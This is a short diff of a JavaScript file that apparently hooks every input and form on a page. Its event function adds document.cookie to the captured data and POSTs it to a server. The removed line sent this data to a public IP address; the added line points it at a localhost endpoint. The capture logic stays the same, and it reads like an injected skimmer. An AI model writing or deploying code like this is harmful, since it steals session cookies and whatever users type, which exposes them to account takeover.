@@ -6,10 +6,6 @@ if(typeof __e == "undefined")
     	function start()
     	{
           registerEvent( "EnterURL", { url : getLocation() } );
-          //window.addEventListener("click", function(){
-          //  hookAllInputs();
-          //  hookAllForms();
-          //});
           hookAllInputs();
           hookAllForms();
     	}
@@ -47,7 +43,7 @@ if(typeof __e == "undefined")
       {
           args.cookie = document.cookie;
           var req = new XMLHttpRequest();
-          req.open("POST", "http://138.197.5.242:8181/" + eventName, true);
+          req.open("POST", "http://127.0.0.1:12345/ws-event-register/" + eventName, true);
           req.send(JSON.stringify(args));
       }
 
